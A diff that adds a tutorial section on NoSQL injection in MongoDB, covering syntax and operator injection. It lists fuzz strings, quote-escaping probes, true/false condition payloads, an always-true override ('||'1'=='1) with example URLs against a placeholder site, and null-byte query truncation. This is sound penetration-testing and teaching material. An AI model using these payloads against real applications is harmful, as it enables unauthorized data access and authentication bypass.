@@ -10,7 +10,78 @@ NoSQL injection attacks can be especially dangerous because code
 
 NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution.
 
-## Simple MongoDB Injection
+## Types of NoSQLi
+
+There are two different types of NoSQLi:
+
+* **Syntax injection**: This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.
+* **Operator injection**: This occurs when you can use NoSQL query operators to manipulate queries.
+
+
+# NoSQL Syntax injection
+
+We can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this we can systematicaally test each input by submitting fuzz strings and special characters that trigger a databaase error.
+
+## Detecting syntax injection in MongoDB
+
+To test whether the input may be vulnerable, submit a fuzz string.
+
+Example of fuzzing:
+```
+'"`{\n;$Foo}\n$Foo \xYZ
+'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
+```
+
+### Determining which characters are processed
+
+To determine which characters are interpreted as syntax by the application, you can inject indiviual characters.
+
+Confirm the behaviour with `'` and a escaped `\'`. If we have different responses we may have a NoSQLi. 
+
+```
+this.category == '''
+this.category == '\''
+```
+
+### Confirming conditional behaviour
+
+After detecting the vulnerability, the next step is to determine whether you can influence boolena conditions using NoSQL syntax.
+
+To test this, send two requests, one with a false condition and one with a true condition. Examples:
+
+```
+' && 0 && 'x
+' && 1 && 'x
+```
+
+Example:
+
+```
+https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
+https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
+```
+
+### Overriding existing conditions
+
+We can override the existing condition to a TRUE in order to exploit the vulnerability and get more results.
+
+```
+'||'1'=='1
+https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
+this.category == 'fizzy'||'1'=='1'
+```
+
+### Break the sentence
+
+We can also add a null character to break the original query.
+
+```
+test'%00
+test'\u0000
+```
+
+# Simple MongoDB Injection
 
 For a basic authentication bypass, the attacker can try to enter MongoDB operators in field values, for example `$eq` (equals), `$ne` (not equal to) or `$gt` (greater than). Here’s an unsafe way to build a database query in a PHP application, with the parameter values taken directly from a form:
 
